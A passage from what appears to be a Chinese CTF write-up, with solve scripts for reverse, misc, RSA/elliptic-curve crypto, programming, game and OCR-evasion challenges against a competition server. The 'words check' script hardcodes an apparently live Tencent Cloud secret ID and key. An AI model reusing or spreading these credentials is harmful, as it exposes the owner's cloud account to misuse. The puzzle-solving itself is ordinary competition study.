punctuation">,</span><span class="token number">0x51</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span>
       <span class="token number">0x03</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x05</span><span class="token punctuation">,</span><span class="token number">0x4D</span><span class="token punctuation">,</span><span class="token number">0x1A</span><span class="token punctuation">,</span><span class="token number">0x19</span><span class="token punctuation">,</span><span class="token number">0x51</span><span class="token punctuation">,</span><span class="token number">0x4E</span><span class="token punctuation">,</span><span class="token number">0x53</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0x09</span><span class="token punctuation">,</span><span class="token number">0x0D</span><span class="token punctuation">,</span><span class="token number">0x43</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span>
       <span class="token number">0x4F</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0x5A</span><span class="token punctuation">,</span><span class="token number">0x5C</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0x4B</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0x03</span><span class="token punctuation">,</span><span class="token number">0x4C</span><span class="token punctuation">,</span><span class="token number">0x1B</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">]</span>

flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

i <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> i <span class="token operator">&lt;</span> <span class="token number">0x2A</span><span class="token punctuation">:</span>
    res<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> res<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> res<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>
    res<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> res<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> res<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">^</span>res<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span>
    res<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> res<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> res<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">3</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> res<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token number">0x7f</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#flag{2d830225-d367-47c0-851b-b9ec765ba0f4}</span>
</code></pre>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="眼神得好"><a href="#眼神得好" class="headerlink" title="眼神得好"></a>眼神得好</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> cv2
<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image


img<span class="token operator">=</span>cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string">'out.bmp'</span><span class="token punctuation">)</span>
img2<span class="token operator">=</span>img<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">^</span>img<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">0</span>
Image<span class="token punctuation">.</span>fromarray<span class="token punctuation">(</span>img2<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'out1.bmp'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#flag{nice_pwnhub}</span>
</code></pre>
<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="esrsa"><a href="#esrsa" class="headerlink" title="esrsa"></a>esrsa</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>

x<span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">338555080220637081961629108201515088631648910827927160728143665306856840891283037339677849661861227903908933145477264046446986150577658634798201036502060805774599658207669111688439996110692201008037849119605962378316457201998475046620515963725786423440494993922281942396227626532022005579340476627086260000576524772862121364339849726687865874619472513654142054490221489754144358483093331358263771080584662872680106076787261957704707055652825959314984924849600101</span><span class="token punctuation">,</span> <span class="token number">936859805496385391559236776246883920797971062581544240268575675825570737296851006237870839271568976317212531276234406232945021531066674291887782791534409966305833225084692612867437424551505174720475931132798839349207246806850341280754752239303350596733681932273450149927797735966407187594725231158980098119489003450563623494155562513634618466910170109518754662675054081897025489520391417883488720972781393802142478712026232107041683271177224983497203599032383279</span><span class="token punctuation">)</span>
n<span class="token operator">=</span><span class="token number">988000511804778695813521569460767024014375863209856154754147082419975777208656083311740358048468580712106204105426217752071608551112269505247365548210006567296850568411531004204795967810292432041395592133501302461324005142940183488044983348152371980166614840414803124031222965874472013554869981954785271467321919039144942853506143787908194930700818770224752026306092706366253640515130802157497666497193713819097381223915943111321812676982912146706199692543488639</span>
e<span class="token operator">=</span><span class="token number">0x10001</span>

F<span class="token punctuation">.</span><span class="token operator">&lt;</span>q<span class="token operator">>=</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
f<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">2</span><span class="token operator">*</span>x<span class="token punctuation">)</span><span class="token operator">*</span>q<span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token punctuation">(</span>x<span class="token operator">**</span><span class="token number">3</span><span class="token operator">-</span>y<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
q<span class="token operator">=</span>int<span class="token punctuation">(</span>f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>beta<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
p<span class="token operator">=</span>n<span class="token operator">//</span>q
E<span class="token operator">=</span>EllipticCurve<span class="token punctuation">(</span>GF<span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>p<span class="token operator">+</span>q<span class="token punctuation">,</span> p<span class="token operator">**</span><span class="token number">2</span><span class="token operator">+</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
phi<span class="token operator">=</span>E<span class="token punctuation">.</span>order<span class="token punctuation">(</span><span class="token punctuation">)</span>
G<span class="token operator">=</span>E<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token operator">*</span>inverse_mod<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>
flag<span class="token operator">=</span>long_to_bytes<span class="token punctuation">(</span>int<span class="token punctuation">(</span>G<span class="token punctuation">.</span>xy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
</code></pre>
<h3 id="rootrsa"><a href="#rootrsa" class="headerlink" title="rootrsa"></a>rootrsa</h3><p>直接在Zmod(n)上对c连续四次开方即可</p>
<h2 id="ppc"><a href="#ppc" class="headerlink" title="ppc"></a>ppc</h2><h3 id="baby-line"><a href="#baby-line" class="headerlink" title="baby line"></a>baby line</h3><pre class=" language-C"><code class="language-C">#include<stdio.h>
int main()
{
    int t,m,n,k,c;
    scanf("%d",&t);
    while(t--){
        scanf("%d%d%d",&m,&n,&k);
        int a[m];
        for(int i=0;i<m;i++){
            a[i]=0;
            for(int j=0;j<n;j++){
                scanf("%d",&c);
                a[i]+=c;
            }
        }
        for(int i=0;i<k;i++){
            c=0;
            for(int j=0;j<m;j++){
                c=a[j]<a[c]?j:c;
            }
            printf("%d",c);
            if(i<k-1)printf(" ");
            a[c]=n+1;
        }
        if(t)printf("\n");
    }
    return 0;
}
</code></pre>
<h3 id="hilbert"><a href="#hilbert" class="headerlink" title="hilbert"></a>hilbert</h3><pre class=" language-C"><code class="language-C">#include<stdio.h>

int t1[7]={0,2,4,1,3,6,5};
int t2[7]={0,3,1,4,2,6,5};

int f(int n,int x,int y){
    //printf("%d %d %d\n",n,x,y);
    if(x==1&&y==1)return 0;
    if(x==(1<<n)&&y==1)return -1;
    if(x==1&&y==(1<<(n-1)))return n%2?5:3;
    if(x==1&&y==(1<<(n-1))+1)return n%2?1:5;
    if(x==(1<<(n-1))&&y==(1<<(n-1))+1)return n%2?6:3;
    if(x==(1<<n)&&y==(1<<(n-1))+1)return n%2?2:5;
    if(x==(1<<(n-1))+1&&y==(1<<(n-1))+1)return n%2?6:4;
    if(x==(1<<n)&&y==(1<<(n-1)))return n%2?5:4;
    if(x<=(1<<(n-1))&&y<=(1<<(n-1)))return t1[f(n-1,(1<<(n-1))+1-y,x)];
    if(x>(1<<(n-1))&&y<=(1<<(n-1)))return t2[f(n-1,y,(1<<n)+1-x)];
    return f(n-1,(x-1)%(1<<(n-1))+1,(y-1)%(1<<(n-1))+1);
}

int main()
{
    int n,x,y,t;
    scanf("%d%d%d",&n,&x,&y);
    while(1){
        t=f(n,x,y);
        if(scanf("%d%d%d",&n,&x,&y)<0){
            printf("%d",t);
            break;
        }
        else printf("%d\n",t);
    }
    return 0;
}
</code></pre>
<h2 id="gaming"><a href="#gaming" class="headerlink" title="gaming"></a>gaming</h2><h3 id="是兄弟就来砍我"><a href="#是兄弟就来砍我" class="headerlink" title="是兄弟就来砍我"></a>是兄弟就来砍我</h3><p>创号登录公告区即可获取flag</p>
<h3 id="初入门径"><a href="#初入门径" class="headerlink" title="初入门径"></a>初入门径</h3><p>看到别人在打boss然后上去蹭拿到了flag之书01<br>描述即为flag</p>
<h3 id="擂台决斗"><a href="#擂台决斗" class="headerlink" title="擂台决斗"></a>擂台决斗</h3><p>不知道怎么搞捏，最后这个题看了一晚上没出，然后最后时刻就看大伙藏的flag掏出来大杀四方喜提纪念品了。无语捏<br>因为抓包没有抓到什么流量，感觉整个flash游戏基本上都是前端在操作，然后去研究swf，似乎逻辑都在这个里面，那么flag物品的描述应该也在这里面，然后就没有然后了，下了swf解包器对着swf文件一个个看，结果一无所获。钱钱离我而去</p>
<h2 id="other"><a href="#other" class="headerlink" title="other"></a>other</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>扫二维码拿到flag</p>
<h3 id="words-check"><a href="#words-check" class="headerlink" title="words check"></a>words check</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> urllib
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> time
<span class="token keyword">import</span> json

<span class="token keyword">from</span> tencentcloud<span class="token punctuation">.</span>common <span class="token keyword">import</span> credential
<span class="token keyword">from</span> tencentcloud<span class="token punctuation">.</span>common<span class="token punctuation">.</span>profile<span class="token punctuation">.</span>client_profile <span class="token keyword">import</span> ClientProfile
<span class="token keyword">from</span> tencentcloud<span class="token punctuation">.</span>common<span class="token punctuation">.</span>profile<span class="token punctuation">.</span>http_profile <span class="token keyword">import</span> HttpProfile
<span class="token keyword">from</span> tencentcloud<span class="token punctuation">.</span>common<span class="token punctuation">.</span>exception<span class="token punctuation">.</span>tencent_cloud_sdk_exception <span class="token keyword">import</span> TencentCloudSDKException
<span class="token keyword">from</span> tencentcloud<span class="token punctuation">.</span>ocr<span class="token punctuation">.</span>v20181119 <span class="token keyword">import</span> ocr_client<span class="token punctuation">,</span> models

secret_id <span class="token operator">=</span> <span class="token string">"AKIDd4E7jAJJyLUMyJxMWP1NTKtkMhkWYGDv"</span>
secret_key <span class="token operator">=</span> <span class="token string">"avzlJdgRw97qHRO5Vf6HBn8E2ZnEQKwH"</span>
<span class="token keyword">def</span> <span class="token function">ocr</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    params <span class="token operator">=</span> <span class="token string">'{"ImageBase64":"'</span> <span class="token operator">+</span> data <span class="token operator">+</span> <span class="token string">'"}'</span>
    cred <span class="token operator">=</span> credential<span class="token punctuation">.</span>Credential<span class="token punctuation">(</span>secret_id<span class="token punctuation">,</span> secret_key<span class="token punctuation">)</span>
    httpProfile <span class="token operator">=</span> HttpProfile<span class="token punctuation">(</span><span class="token punctuation">)</span>
    httpProfile<span class="token punctuation">.</span>endpoint <span class="token operator">=</span> <span class="token string">"ocr.tencentcloudapi.com"</span>

    clientProfile <span class="token operator">=</span> ClientProfile<span class="token punctuation">(</span><span class="token punctuation">)</span>
    clientProfile<span class="token punctuation">.</span>httpProfile <span class="token operator">=</span> httpProfile

    client <span class="token operator">=</span> ocr_client<span class="token punctuation">.</span>OcrClient<span class="token punctuation">(</span>cred<span class="token punctuation">,</span> <span class="token string">"ap-guangzhou"</span><span class="token punctuation">,</span> clientProfile<span class="token punctuation">)</span>

    req <span class="token operator">=</span> models<span class="token punctuation">.</span>GeneralBasicOCRRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    req<span class="token punctuation">.</span>from_json_string<span class="token punctuation">(</span>params<span class="token punctuation">)</span>
    resp <span class="token operator">=</span> client<span class="token punctuation">.</span>GeneralBasicOCR<span class="token punctuation">(</span>req<span class="token punctuation">)</span>
    <span class="token keyword">return</span> resp<span class="token punctuation">.</span>TextDetections<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>DetectedText

url<span class="token operator">=</span><span class="token string">'http://47.97.127.1:26432'</span>
token<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'/getToken'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span>
words<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'/getViolWords'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'violWords'</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    res<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'/getPic'</span><span class="token punctuation">,</span>json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'token'</span><span class="token punctuation">:</span>token<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
    data<span class="token operator">=</span>res<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'words'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'w1'</span><span class="token punctuation">]</span>
    sentence<span class="token operator">=</span>ocr<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    f<span class="token operator">=</span>any<span class="token punctuation">(</span><span class="token punctuation">(</span>word <span class="token keyword">in</span> sentence<span class="token punctuation">)</span> <span class="token keyword">for</span> word <span class="token keyword">in</span> words<span class="token punctuation">)</span><span class="token operator">==</span><span class="token boolean">False</span>
    res<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'/submits'</span><span class="token punctuation">,</span>json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'token'</span><span class="token punctuation">:</span>token<span class="token punctuation">,</span><span class="token string">'answer'</span><span class="token punctuation">:</span>f<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>res<span class="token punctuation">)</span>
res<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'/getFlag'</span><span class="token punctuation">,</span>json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'token'</span><span class="token punctuation">:</span>token<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>

</code></pre>
<h3 id="medium-black-ocr"><a href="#medium-black-ocr" class="headerlink" title="medium black ocr"></a>medium black ocr</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token punctuation">,</span>ImageDraw<span class="token punctuation">,</span>ImageFont
<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
<span class="token keyword">import</span> pytesseract
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> io

FONT_SIZE <span class="token operator">=</span> <span class="token number">30</span>
TEXT_LENGTH <span class="token operator">=</span> <span class="token number">10</span>
FIG_SHAPE <span class="token operator">=</span> <span class="token punctuation">(</span>FONT_SIZE <span class="token operator">*</span> TEXT_LENGTH <span class="token operator">//</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">20</span><span class="token punctuation">,</span> FONT_SIZE <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">array2b64</span><span class="token punctuation">(</span>np_array<span class="token punctuation">)</span><span class="token punctuation">:</span>
    buffer <span class="token operator">=</span> np_array<span class="token punctuation">.</span>tobytes<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>buffer<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">b642array</span><span class="token punctuation">(</span>bb64_buffer<span class="token punctuation">,</span> reshape<span class="token operator">=</span><span class="token punctuation">(</span>FIG_SHAPE<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> FIG_SHAPE<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        x <span class="token operator">=</span> np<span class="token punctuation">.</span>frombuffer<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>bb64_buffer<span class="token punctuation">)</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>np<span class="token punctuation">.</span>float32<span class="token punctuation">)</span>
        x <span class="token operator">=</span> x<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># frombuffer的数据不可写</span>
        x <span class="token operator">*=</span> <span class="token number">255</span>
        x <span class="token operator">=</span> x<span class="token punctuation">.</span>astype<span class="token punctuation">(</span>np<span class="token punctuation">.</span>uint8<span class="token punctuation">)</span>
        x <span class="token operator">=</span> x<span class="token punctuation">.</span>reshape<span class="token punctuation">(</span>reshape<span class="token punctuation">)</span>
        <span class="token keyword">return</span> x
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"No Hack ! BAD BUFFER"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

<span class="token keyword">def</span> <span class="token function">generate_fig</span><span class="token punctuation">(</span>text_raw<span class="token punctuation">,</span> font_size<span class="token operator">=</span>FONT_SIZE<span class="token punctuation">)</span><span class="token punctuation">:</span>
    s <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>
    im <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"L"</span><span class="token punctuation">,</span> FIG_SHAPE<span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span>
    dr <span class="token operator">=</span> ImageDraw<span class="token punctuation">.</span>Draw<span class="token punctuation">(</span>im<span class="token punctuation">)</span>
    font <span class="token operator">=</span> ImageFont<span class="token punctuation">.</span>truetype<span class="token punctuation">(</span><span class="token string">"ubuntu.ttf"</span><span class="token punctuation">,</span> font_size<span class="token punctuation">)</span>
    dr<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> text_raw<span class="token punctuation">,</span> font<span class="token operator">=</span>font<span class="token punctuation">,</span> fill<span class="token operator">=</span><span class="token string">"#000000"</span><span class="token punctuation">)</span>
    im<span class="token punctuation">.</span>save<span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">'png'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> Image<span class="token punctuation">.</span>open<span class="token punctuation">(</span>s<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">_predict</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    use py tesseract to predict image
    :param x:
    :return:
    """</span>
    x <span class="token operator">=</span> Image<span class="token punctuation">.</span>fromarray<span class="token punctuation">(</span>x<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'L'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token operator">not</span> <span class="token punctuation">(</span>x<span class="token punctuation">.</span>size <span class="token operator">==</span> FIG_SHAPE <span class="token operator">and</span> x<span class="token punctuation">.</span>mode <span class="token operator">==</span> <span class="token string">'L'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"img format error"</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        result <span class="token operator">=</span> pytesseract<span class="token punctuation">.</span>image_to_string<span class="token punctuation">(</span>x<span class="token punctuation">,</span> config<span class="token operator">=</span><span class="token string">" tessedit_char_whitelist=abcdefghijklmnopqrstuvwxyz "</span><span class="token punctuation">)</span>
        result <span class="token operator">=</span> result<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
        result <span class="token operator">=</span> result<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
        result <span class="token operator">=</span> result<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\x0c"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> result
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token string">""</span>

imgs<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token keyword">for</span> c <span class="token keyword">in</span> string<span class="token punctuation">.</span>ascii_lowercase<span class="token punctuation">:</span>
    imgs<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token operator">=</span>np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>generate_fig<span class="token punctuation">(</span>c<span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span>dtype<span class="token operator">=</span>np<span class="token punctuation">.</span>float32<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">]</span>

url<span class="token operator">=</span><span class="token string">'http://47.97.127.1:26857'</span>
br<span class="token operator">=</span>requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> k <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    res<span class="token operator">=</span>br<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'/start'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
    origin<span class="token operator">=</span>res<span class="token punctuation">[</span>res<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">' `'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">:</span>res<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'` '</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    target<span class="token operator">=</span>res<span class="token punctuation">[</span>res<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'as `'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">:</span>res<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'`.'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    img<span class="token operator">=</span>np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>generate_fig<span class="token punctuation">(</span>origin<span class="token punctuation">)</span><span class="token punctuation">,</span>np<span class="token punctuation">.</span>float32<span class="token punctuation">)</span>
    ms<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> origin<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>target<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>
            ms<span class="token punctuation">.</span>append<span class="token punctuation">(</span>imgs<span class="token punctuation">[</span>origin<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            ms<span class="token punctuation">.</span>append<span class="token punctuation">(</span>imgs<span class="token punctuation">[</span>origin<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">0.5</span><span class="token operator">+</span>imgs<span class="token punctuation">[</span>target<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">0.5</span><span class="token punctuation">)</span>
    ms<span class="token punctuation">.</span>append<span class="token punctuation">(</span>np<span class="token punctuation">.</span>ones<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dtype<span class="token operator">=</span>np<span class="token punctuation">.</span>float32<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">255</span><span class="token punctuation">)</span>
    img2<span class="token operator">=</span>np<span class="token punctuation">.</span>hstack<span class="token punctuation">(</span>ms<span class="token punctuation">)</span>

    res<span class="token operator">=</span>br<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'/predict'</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">'b64_image'</span><span class="token punctuation">:</span>array2b64<span class="token punctuation">(</span>img2<span class="token operator">*</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
